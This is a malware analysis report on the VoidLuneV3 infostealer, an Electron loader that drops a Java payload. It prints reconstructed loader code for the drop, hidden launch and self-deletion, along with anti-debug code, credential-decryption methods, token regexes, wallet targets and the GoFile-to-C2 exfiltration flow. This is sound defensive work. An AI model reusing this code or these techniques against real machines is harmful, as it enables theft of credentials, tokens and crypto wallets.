# VoidLuneV3 — Electron/Java Infostealer — Full Malware Analysis

> **TLP: WHITE** — Suitable for public distribution
> **Date:** 2026-06-22
> **Severity:** CRITICAL
> **Malware Family:** VoidLuneV3
> **Type:** Multi-stage Infostealer (Electron loader + Java payload)

---

## Table of Contents

1. [Executive Summary](#executive-summary)
2. [Sample Information](#sample-information)
3. [Attack Chain](#attack-chain)
4. [Stage 1 — Electron JS Loader](#stage-1--electron-js-loader)
5. [Stage 2 — Java Payload](#stage-2--java-payload-salamsjar)
6. [Capability Map](#capability-map)
7. [C2 Infrastructure](#c2-infrastructure)
8. [Browser Credential Theft](#browser-credential-theft)
9. [Discord Token Stealer](#discord-token-stealer)
10. [Cryptocurrency Wallet Theft](#cryptocurrency-wallet-theft)
11. [Anti-Analysis Techniques](#anti-analysis-techniques)
12. [IOCs](#iocs)
13. [MITRE ATT&CK Mapping](#mitre-attck-mapping)
14. [Source Files](#source-files)

---

## Executive Summary

**VoidLuneV3** is a heavily obfuscated, multi-stage information stealer distributed as a fake Electron desktop application (`.exe` with bundled Chromium). Upon execution it silently drops a Java payload (`salams.jar`) and a bundled JVM (`javam.exe`) into `%LOCALAPPDATA%`, runs it fully detached from any visible window, then self-destructs all source files.

The Java payload (obfuscated with **Zelix KlassMaster v26.0.2**) spawns 18+ parallel threads to simultaneously steal:
- Credentials, cookies, and session tokens from **23 browsers**
- **Discord tokens** with account badge/tier profiling for valuation
- **Azure/Microsoft OAuth tokens**
- **44+ cryptocurrency wallet browser extensions** and 10 desktop wallets
- Full **desktop screenshots**
- **Text files** from the victim's Desktop

All stolen data is packed into a ZIP archive, uploaded to **GoFile** (a legitimate file hosting service abused as a dead-drop), and the resulting download link is then POSTed to the attacker's C2 at `swordfull.com`. A **UAC elevation helper** (`elevate.exe`) is bundled to attempt privilege escalation before payload execution.

---

## Sample Information

| Field | Value |
|-------|-------|
| File Type | PE32+ Electron application |
| Author Tag | `VoidLuneV3` (package.json description + author) |
| Stage 1 Entry | `app.asar` via `75x5mr.js` shim -> `dnufit5.js` |
| Stage 1 Obfuscation | LZString UTF-16 compression + control-flow flattening |
| Stage 2 Payload | `salams.jar` (Java 11+) |
| Stage 2 Obfuscation | Zelix KlassMaster v26.0.2 |
| Bundled JVM | `javam.exe` (stripped JRE, `resources/jvm/`) |
| Elevation Helper | `elevate.exe` (ShellExecuteExW runas, x86 PE32) |
| Elevation Helper PDB | `C:\Dev\elevate\bin\x86\Release\Elevate.pdb` |
| Platform | Windows x64 (x86 elevation helper) |

---

## Attack Chain

```
[Victim runs fake .exe]
        |
        v
[NSIS installer extracts Electron app]
        |
        v
[Electron loads app.asar]
        |
        v
[75x5mr.js shim -> require('./dnufit5.js')]
        |
        v
[dnufit5.js: LZString UTF-16 decompress -> eval(payload)]
        |
        v
[JS resolves %LOCALAPPDATA%\[random]\{bin,lib}]
        |
        +---> Copies javam.exe  -> %LOCALAPPDATA%\[rand]\bin\javam.exe
        +---> Copies salams.jar -> %LOCALAPPDATA%\[rand]\lib\salams.jar
        |
        v
[Attempts UAC elevation via elevate.exe (ShellExecuteExW runas)]
        |
        v
[spawn('javam.exe', ['-jar','salams.jar'], {detached:true, stdio:'ignore'})]
[child.unref() -> Java process survives Electron exit]
        |
        v
[app.quit() + rmSync(resources, recursive:true) -> self-destruct]
        |
        v
[salams.jar: a.Main -> anti-debug JVM arg check -> mutex check -> a.b.D.r1n()]
        |
        v
[ExecutorService: 18+ parallel threads spawned]
    |         |         |         |         |
    v         v         v         v         v
[Browser  [Discord  [Crypto   [Screen-  [SysInfo +
 Stealer]  Tokens]   Wallets]  shot]     Proc List]
    |         |         |         |         |
    +----+----+---------+---------+---------+
         |
         v
   [Pack all data into ZIP (ZipOutputStream)]
         |
         v
   [POST ZIP -> https://upload.gofile.io/uploadfile]
         |
         v
   [GoFile returns download URL]
         |
         v
   [POST {url + victim metadata} -> https://swordfull.com/m/]
```

---

## Stage 1 — Electron JS Loader

**File:** `app.asar/dnufit5.js` (entry shim: `75x5mr.js` -> `require('./dnufit5.js')`)
**Compressed size:** ~63 KB
**Obfuscation:** LZString UTF-16 compression + control-flow flattening

### Key Behaviors (reconstructed from deobfuscation)

```javascript
// Resolves drop directory under %LOCALAPPDATA%
const localAppData = process.env.LOCALAPPDATA ||
                     path.join(process.env.USERPROFILE, 'AppData', 'Local');
const dropDir = path.join(localAppData, randomDirName);

// Drops payload files from bundled resources
fs.mkdirSync(path.join(dropDir, 'bin'), { recursive: true });
fs.mkdirSync(path.join(dropDir, 'lib'), { recursive: true });
fs.copyFileSync(jvmSrc,  path.join(dropDir, 'bin', 'javam.exe'));
fs.copyFileSync(jarSrc,  path.join(dropDir, 'lib', 'salams.jar'));

// Attempt UAC elevation (silently fails if user denies)
spawn('elevate.exe', ['javam.exe', '-jar', 'salams.jar'], { ... });

// Detached execution — Java process survives Electron exit
const child = spawn(javamPath, ['-jar', jarPath], {
    detached: true,
    stdio:    'ignore'
});
child.unref();

// Self-destruct — removes all evidence from resources dir
app.quit();
fs.rmSync(resourcesPath, { recursive: true, force: true });
```

**Deobfuscated source:** `source/Stage1_Electron_Loader_Deobfuscated.js`

---

## Stage 2 — Java Payload (salams.jar)

**Obfuscator:** Zelix KlassMaster v26.0.2
**Entry point:** `a.Main` -> `a.b.D.r1n()`
**Architecture:** `ExecutorService` with 18+ parallel worker threads

### Class Map (Obfuscated Name -> Purpose)

| Obfuscated Class | Purpose |
|-----------------|---------|
| `a.Main` | Entry point: anti-debug check, mutex, launch orchestrator |
| `a.b.D` | Thread orchestrator — spawns all stealer modules |
| `a.b.d.dec` | Chromium DPAPI decryptor + Firefox NSS/PK11SDR decryptor |
| `a.b.d.dec$NssLib` | JNA interface to `nss3.dll` for Firefox decryption |
| `a.b.d.dec$NssSec` | Firefox NSS SECITEM struct (JNA) |
| `a.b.d.a` | Browser stealer — Opera Air |
| `a.b.d.b` | Browser stealer — Brave |
| `a.b.d.c` | Browser stealer — Chrome |
| `a.b.d.e` | Browser stealer — Edge |
| `a.b.d.f` | Browser stealer — Firefox |
| `a.b.d.g` | Browser stealer — Opera GX |
| `a.b.d.j` | Mutex handler (Win32 CreateMutex via JNA) |
| `a.b.d.o` | Browser stealer — Opera |
| `a.b.d.t` | Browser stealer — Tor Browser |
| `a.b.d.v` | Browser stealer — Vivaldi |
| `a.b.d.wf` | Browser stealer — Waterfox |
| `a.b.d.y` | Browser stealer — Yandex |
| `a.b.d.ze` | Browser stealer — Zen Browser |
| `a.b.c.i` | Discord token stealer + account profiler |
| `a.b.c.k` | Cryptographic key utility |
| `a.b.c.p` | Discord badge enumerator + C2 exfiltration sender |
| `a.b.c.u` | Anti-VM: hostname/username/GPU blocklist (400+ entries) |
| `a.b.c.x` | HTTP client for C2 communication (`swordfull.com`) |
| `a.b.c.z` | ZIP packer for exfiltration bundle |
| `a.b.e.gf` | GoFile multipart uploader |
| `a.b.e.m` | `Runtime.exec()` command executor |
| `a.b.e.q` | File enumerator (.txt harvester) |
| `a.b.e.r` | Crypto wallet extension stealer |
| `a.b.e.s` | Screenshot capture (`java.awt.Robot`) |
| `a.b.e.u` | Process enumerator + `lsass.exe` hunter + VM process check |
| `a.b.e.w` | Desktop crypto wallet + browser extension wallet stealer |

---

## Capability Map

```
VoidLuneV3 Capabilities
|
+-- INITIAL ACCESS
|   +-- Fake Electron desktop application (.exe)
|
+-- EXECUTION
|   +-- Electron JS eval() of LZString-compressed payload
|   +-- Java process spawned detached via javam.exe -jar salams.jar
|
+-- PRIVILEGE ESCALATION
|   +-- elevate.exe (ShellExecuteExW + runas verb, UAC prompt)
|       PDB: C:\Dev\elevate\bin\x86\Release\Elevate.pdb
|
+-- DEFENSE EVASION
|   +-- Two-stage obfuscation (LZString + Zelix KlassMaster v26)
|   +-- Process runs with no window (stdio:ignore, detached)
|   +-- Self-deletes all source files after drop (rmSync recursive)
|   +-- Fake Chrome User-Agent on all HTTP requests
|   +-- JVM debugger argument detection -> System.exit(0)
|   +-- Mutex enforcement (single instance)
|   +-- 400+ sandbox hostname/username blocklist
|   +-- VM process detection (vmtoolsd, vboxtray, qemu-ga, etc.)
|   +-- VM GPU string detection (VMware SVGA, VirtualBox, Hyper-V)
|
+-- CREDENTIAL ACCESS
|   +-- Chromium browsers (19 targets)
|   |   +-- CryptUnprotectData (DPAPI) -> AES-256-GCM master key
|   |   +-- Decrypts Login Data (passwords) + Cookies
|   +-- Gecko browsers (4 targets)
|   |   +-- JNA load nss3.dll -> NSS_Init -> PK11SDR_Decrypt
|   |   +-- Decrypts key4.db / logins.json
|   +-- Discord tokens (regex match on leveldb/localStorage)
|   +-- Azure/Microsoft OAuth tokens
|
+-- COLLECTION
|   +-- Full desktop screenshot (java.awt.Robot)
|   +-- Desktop .txt file harvest
|   +-- Running process list (CreateToolhelp32Snapshot)
|   +-- lsass.exe targeting (DPAPI master key / credential dump)
|   +-- 10 desktop crypto wallets
|   +-- 44+ browser extension crypto wallets
|   +-- Discord account badge profiling (account valuation)
|
+-- EXFILTRATION
    +-- ZIP all stolen data (ZipOutputStream -> ByteArrayOutputStream)
    +-- POST ZIP to GoFile (https://upload.gofile.io/uploadfile)
    +-- POST {GoFile URL + victim info} to C2 (https://swordfull.com/m/)
```

---

## C2 Infrastructure

| Role | Endpoint | Protocol |
|------|----------|----------|
| **Primary C2** | `https://swordfull.com/m/` | HTTPS POST (Java 11 HttpClient) |
| **Exfil staging** | `https://upload.gofile.io/uploadfile` | HTTPS multipart POST |

**User-Agent (spoofed):**
```
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
```

### Exfiltration Flow Detail

```
Step 1: Pack all stolen data into in-memory ZIP
        a.b.c.z: ZipOutputStream -> ByteArrayOutputStream

Step 2: Multipart POST to GoFile
        POST https://upload.gofile.io/uploadfile
        Content-Type: multipart/form-data
        Body: [ZIP file bytes]
        Response: {"status":"ok","data":{"downloadPage":"https://gofile.io/d/XXXX",...}}

Step 3: Extract download URL from GoFile response

Step 4: POST metadata to attacker C2
        POST https://swordfull.com/m/
        Body: { download_url, hostname, username, discord_badges, ... }
```

> **Why GoFile?** All sensitive victim data travels over `upload.gofile.io` — a trusted, legitimate CDN. Network monitoring tools see a standard file upload. Only a small metadata beacon goes to the actual C2 domain, making detection significantly harder.

**Source class:** `a.b.c.x` (field `U = "https://swordfull.com/m/"`)
**Exfil class:** `a.b.e.gf` (field `w = "https://upload.gofile.io/uploadfile"`)

---

## Browser Credential Theft

### Chromium-based Browsers (19 targets)

Decryption method: reads `Local State` JSON -> base64-decodes `encrypted_key` -> calls `CryptUnprotectData` (DPAPI) -> uses resulting key to AES-256-GCM decrypt all stored passwords and cookies.

| Browser | Path |
|---------|------|
| Chrome | `%LOCALAPPDATA%\Google\Chrome\User Data` |
| Microsoft Edge | `%LOCALAPPDATA%\Microsoft\Edge\User Data` |
| Brave | `%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data` |
| Opera | `%APPDATA%\Opera Software\Opera Stable` |
| Opera GX | `%APPDATA%\Opera Software\Opera GX Stable` |
| Opera Air | `Browsers/Opera Air/` |
| Vivaldi | `%LOCALAPPDATA%\Vivaldi\User Data` |
| Yandex | `%LOCALAPPDATA%\Yandex\YandexBrowser\User Data` |
| CentBrowser | `%LOCALAPPDATA%\CentBrowser\User Data` |
| Chrome SxS (Canary) | `%LOCALAPPDATA%\Google\Chrome SxS\User Data` |
| Kometa | `%LOCALAPPDATA%\Kometa\User Data` |
| Epic Privacy Browser | `%LOCALAPPDATA%\Epic Privacy Browser\User Data` |
| Iridium | `%LOCALAPPDATA%\Iridium\User Data` |
| Torch | `%LOCALAPPDATA%\Torch\User Data` |
| Orbitum | `%LOCALAPPDATA%\Orbitum\User Data` |
| Sputnik | `%LOCALAPPDATA%\Sputnik\Sputnik\User Data` |
| 7Star | `%LOCALAPPDATA%\7Star\7Star\User Data` |
| Uran | `%LOCALAPPDATA%\uCozMedia\Uran\User Data` |
| Amigo | `%LOCALAPPDATA%\Amigo\User Data` |

**JNA APIs used:** `Crypt32Util.cryptUnprotectData`, `NCryptDecrypt`, `NCryptOpenStorageProvider`

### Gecko/Firefox-based Browsers (4 targets)

Decryption method: dynamically loads `nss3.dll` via JNA, calls `NSS_Init(profilePath)` then `PK11SDR_Decrypt` to decrypt the Firefox key database and credential store.

| Browser | Path |
|---------|------|
| Firefox | `%APPDATA%\Mozilla\Firefox\Profiles` |
| Waterfox | `%APPDATA%\Waterfox\Profiles` |
| Zen Browser | `%APPDATA%\zen\Profiles` |
| Tor Browser | `Browsers/TorBrowser/` |

**JNA interfaces:** `dec$NssLib.NSS_Init`, `dec$NssLib.PK11SDR_Decrypt`, `SECITEM_FreeItem`

---

## Discord Token Stealer

### Token Extraction Patterns

```
Standard token:  ([\w-]{24,28}\.[\w-]{6}\.[\w-]{25,110})
MFA token:       (mfa\.[\w-]{84})
Azure OAuth:     ([\w-]{10,}\.login\.windows\.net-[\w-]+)
YouTube-DL:      dQw4w9WgXcQ:([^"\s]*)
```

### Discord Paths Targeted

```
%APPDATA%\discord
%APPDATA%\discordptb
%APPDATA%\discordcanary
%APPDATA%\Lightcord
```

### Account Badge Profiling

The malware enumerates Discord account badges to assign monetary value before exfiltration. Higher-tier accounts are likely prioritized or sold at premium:

`staff` | `partner` | `hypesquad` | `bug_hunter_level_1` | `bug_hunter_level_2`
`early_supporter` | `verified_developer` | `active_developer` | `certified_moderator`
`guild_booster_lvl1` through `guild_booster_lvl9`
`nitro` | `nitro_gold` | `nitro_silver` | `nitro_bronze` | `nitro_ruby`
`nitro_emerald` | `nitro_opal` | `nitro_diamond` | `nitro_platinum`
`quest_completed` | `orb_profile_badge`

---

## Cryptocurrency Wallet Theft

### Desktop Wallets (10)

| Wallet | Stolen Path |
|--------|------------|
| Exodus | `Exodus\exodus.wallet` |
| Electrum | `Electrum\wallets` |
| Atomic Wallet | `atomic\Local Storage\leveldb` |
| Guarda | `Guarda\Local Storage\leveldb` |
| Coinomi | `Coinomi\Coinomi\wallets` |
| Jaxx Liberty | `com.liberty.jaxx\IndexedDB\file__0.indexeddb.leveldb` |
| Ethereum Keystore | `Ethereum\keystore` |
| Bytecoin | `bytecoin` |
| Zcash | `Zcash` |
| Armory | `Armory` |

### Browser Extension Wallets (44+ targets)

| Wallet | Extension ID |
|--------|-------------|
| MetaMask | `nkbihfbeogaeaoehlefnkodbefgpgknn` |
| MetaMask (alt) | `aodkkagnadcbobfpggfnjeongemjbjca` |
| Phantom | `bfnaelmomeimhlpmgjnjophhpkkoljpa` |
| Coinbase Wallet | `hnfanknocfeofbddgcijnmhnfnkdnaad` |
| Trust Wallet | `egjidjbpglichdcondbcbdnbeeppgdph` |
| Keplr | `dmkamcknogkgcdfhhbddcghachkejeap` |
| Ronin | `eigblbgjknlfbajkfhopmcojidlgcehm` |
| Yoroi | `ffnbelfdoeiohenkjibnmadjiehjhajb` |
| Nami | `lpfcbjknijpeeillifnkikgncikgfhdo` |
| Petra (Aptos) | `ejjladinnckdgjemekebdpeokbikhfci` |
| Martian | `blnieiiffboillknjnepogjhkgnoapac` |
| Math Wallet | `afbcbjpbpfadlkmhmclhkeeodmamcflc` |
| Binance Chain | `fhbohimaelbohpjbbldcngcnapndodjp` |
| XDEFI | `hmeobnfnfcmdkdcmlblgagmfpfboieaf` |
| Liquality | `kpfopkelmapcoipemfendmdcghnegimn` |
| Slope | `pocmplpaccanhmnllbbkpgfliimjljgo` |
| Safepal | `lgmpcpglpngdoalbgeoldeajfclnhafa` |
| Tokenpocket | `nphplpgoakhhjchkkhmiggakijnkhfnd` |
| Kaikas | `jblndlipeogpafnldhgmapagcccfchpi` |
| TerraStation | `aiifbnbfobpmeekipheeijimdpnlpgpp` |
| Coin98 | `aeachknmefphepccionboohckonoeemg` |
| Nifty | `jbdaocneiiinmjbjlgalhcelgbejmnid` |
| PaliWallet | `efbglgofoippbgcjepnhiblaibcnclgk` |
| BoltX | `aodkkagnadcbobfpggfnjeongemjbjca` |
| Fewcha | `fhilaheimglignddkjgofkcbgekhenbh` |
| Starcoin | `mfhbebgoclkghebffdldpobeajmbecfk` |
| Swash | `cmndjbecilbocjfkibfbifhngkdmjgog` |
| Finnie | `cjelfplplebdjjenllpjcblmjkfcffne` |
| Guild | `fnnegphlobjdpkhecapkijjdkgcjhkib` |
| KardiaChain | `abnegfkaffbgelpmjddhflpocdjfbkna` |
| + 14 more | See `source/CryptoWallet_DesktopAndExtension_Stealer.javap` |

---

## Anti-Analysis Techniques

### 1. Two-Stage Obfuscation

- **Stage 1 (JS):** LZString UTF-16 compression + control-flow flattening. The entire payload is a single compressed string that is decompressed and `eval()`'d at runtime.
- **Stage 2 (Java):** Zelix KlassMaster v26.0.2. All string constants are encrypted with XOR + rotating key and a 256-entry S-box decoder. All class and method names are renamed to single letters.

### 2. Anti-Debug — JVM Argument Inspection

```java
List<String> args = ManagementFactory.getRuntimeMXBean().getInputArguments();
for (String arg : args) {
    if (arg.contains("-agentlib:jdwp") ||
        arg.contains("-Xdebug")        ||
        arg.contains("-javaagent")     ||
        arg.contains("-Xrunjdwp")) {
        System.exit(0);  // Silent exit if debugger detected
    }
}
```

### 3. Mutex / Single Instance

Uses Win32 `CreateMutex` via JNA (`a.b.d.j` — two `WinNT$HANDLE` fields) to prevent multiple instances running simultaneously.

### 4. Anti-VM — Hostname/Username Blocklist (400+ entries)

Checks `System.getProperty("user.name")` and machine hostname against a hardcoded list. If matched, execution aborts. Sample entries:

`WDAGUtilityAccount` `azure` `test` `sandbox` `floppy` `DefaultAccount` `Guest`
`COMPNAME_4803` `COMPNAME_4416` `COMPNAME_3485` `DESKTOP-0000000` `vmwaretray`
`prl_tools` `vboxtray` `qemu-ga` `xenservice` + 390 more

### 5. Anti-VM — Process Detection

Checks running process list for virtualization-related processes:

| Process | Platform |
|---------|---------|
| `vmwaretray`, `vmwareuser`, `vmusrvc`, `vmtoolsd`, `vgauthservice`, `vmacthlp` | VMware |
| `prl_cc`, `prl_tools` | Parallels |
| `vboxtray`, `vboxservice` | VirtualBox |
| `xenservice` | Xen |
| `qemu-ga` | QEMU |

### 6. Anti-VM — GPU String Detection

Checks display adapter device name:

- `VMware SVGA 3D`
- `VirtualBox Graphics Adapter`
- `VirtualBox Graphics Adapter (WDDM)`
- `Microsoft Hyper-V Video`
- `Virtual Desktop Monitor`
- `ASPEED Graphics Family(WDDM)`
- `Standard VGA Graphics Adapter`
- `Microsoft Basic Display Adapter`
- `Microsoft Remote Display Adapter`

---

## IOCs

### Network

```
swordfull.com                    [C2 — BLOCK]
upload.gofile.io                 [Exfil staging — legitimate service abused]

POST https://swordfull.com/m/
POST https://upload.gofile.io/uploadfile

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
```

### File System

```
%LOCALAPPDATA%\[random]\bin\javam.exe   [dropped JVM]
%LOCALAPPDATA%\[random]\lib\salams.jar  [dropped Java payload]
```

### Process

```
javam.exe spawned from %LOCALAPPDATA%\*\bin\ with -jar flag
javam.exe has no visible window (stdio:ignore, detached from parent)
Parent Electron process exits immediately after spawn
```

### Strings (plaintext — survives obfuscation removal)

```
VoidLuneV3
salams.jar
javam.exe
ZKM26.0.2
swordfull.com
https://swordfull.com/m/
https://upload.gofile.io/uploadfile
ISO-8859-1
```

### Token Regex Signatures

```
([\w-]{24,28}\.[\w-]{6}\.[\w-]{25,110}|mfa\.[\w-]{84})
[\w-]{10,}\.login\.windows\.net-[\w-]+
dQw4w9WgXcQ:([^"\s]*)
```

---

## MITRE ATT&CK Mapping

| Technique ID | Name | Implementation |
|-------------|------|----------------|
| T1059.007 | JavaScript Execution | Electron JS loader (dnufit5.js) |
| T1027 | Obfuscated Files | LZString UTF-16 + ZKM26 two-stage obfuscation |
| T1027.002 | Software Packing | Zelix KlassMaster v26.0.2 |
| T1548.002 | Bypass UAC | elevate.exe via ShellExecuteExW runas verb |
| T1555.003 | Credentials from Web Browsers | 23 browsers — DPAPI + NSS decryption |
| T1539 | Steal Web Session Cookie | All targeted browsers |
| T1528 | Steal Application Access Token | Discord tokens, Azure OAuth tokens |
| T1005 | Data from Local System | Crypto wallets, .txt files |
| T1113 | Screen Capture | java.awt.Robot.createScreenCapture() |
| T1041 | Exfiltration Over C2 Channel | HTTPS POST to swordfull.com |
| T1567.002 | Exfiltration to Cloud Storage | GoFile dead-drop (upload.gofile.io) |
| T1622 | Debugger Evasion | JVM input argument inspection |
| T1497.001 | Virtualization/Sandbox Evasion | 400+ hostname blocklist + GPU + process checks |
| T1057 | Process Discovery | CreateToolhelp32Snapshot + lsass.exe targeting |
| T1083 | File and Directory Discovery | Wallet paths + Desktop .txt enumeration |
| T1480 | Execution Guardrails | Mutex + single-instance enforcement |

---

## Source Files

All disassembled `.javap` files and deobfuscated source are in `source/`:

| File | Description |
|------|-------------|
| `Stage1_Electron_Loader_Deobfuscated.js` | Stage 1 JS loader, fully deobfuscated |
| `Stage2_EntryPoint_Main.javap` | `a.Main` — entry point, anti-debug |
| `Stage2_Orchestrator_ThreadDispatcher.javap` | `a.b.D` — 18-thread orchestrator |
| `BrowserStealer_Chromium_DPAPI_Firefox_NSS.javap` | Core credential decryptor |
| `BrowserStealer_Firefox_NssLib_JNA.javap` | JNA interface to nss3.dll |
| `BrowserStealer_Firefox_NssSec_JNA.javap` | NSS SECITEM JNA struct |
| `BrowserStealer_Brave.javap` | Brave browser stealer |
| `BrowserStealer_Chrome.javap` | Chrome browser stealer |
| `BrowserStealer_Edge.javap` | Edge browser stealer |
| `BrowserStealer_Firefox.javap` | Firefox browser stealer |
| `BrowserStealer_Opera.javap` | Opera browser stealer |
| `BrowserStealer_OperaGX.javap` | Opera GX browser stealer |
| `BrowserStealer_OperaAir.javap` | Opera Air browser stealer |
| `BrowserStealer_TorBrowser.javap` | Tor Browser stealer |
| `BrowserStealer_Vivaldi.javap` | Vivaldi browser stealer |
| `BrowserStealer_Waterfox.javap` | Waterfox browser stealer |
| `BrowserStealer_Yandex.javap` | Yandex browser stealer |
| `BrowserStealer_ZenBrowser.javap` | Zen Browser stealer |
| `DiscordTokenStealer_AccountProfiler.javap` | Discord token + badge profiler |
| `DiscordTokenStealer_BadgeEnumerator_C2Sender.javap` | Badge enum + C2 POST |
| `AntiVM_SandboxEvasion_HostnameBlocklist.javap` | 400+ entry blocklist |
| `C2_Exfiltration_HTTP_Client.javap` | Java HttpClient C2 comms |
| `Exfil_GoFile_Upload.javap` | GoFile multipart uploader |
| `Exfil_ZipPacker.javap` | ZIP bundle packer |
| `CryptoWallet_DesktopAndExtension_Stealer.javap` | Full wallet stealer |
| `CryptoWallet_ExtensionStealer.javap` | Extension wallet stealer |
| `Mutex_SingleInstance_Guard.javap` | Win32 CreateMutex handler |
| `ProcessEnumerator_LSASS_VMCheck.javap` | Process enum + lsass hunt |
| `Screenshot_Capture.javap` | java.awt.Robot screenshot module |
| `SystemInfo_FileEnumerator.javap` | .txt harvester + sysinfo |
| `CommandExecution_RuntimeExec.javap` | Runtime.exec() module |
| `Crypto_KeyUtility.javap` | Cryptographic key helper |
| `Runtime_DecryptedStrings_AllClasses.txt` | All runtime-decrypted strings from all 29 classes |

---

*Analysis performed 2026-06-22 using static bytecode analysis (javap), LZString JS deobfuscation, and runtime forced class initialization with JVM socket-level network blocking.*
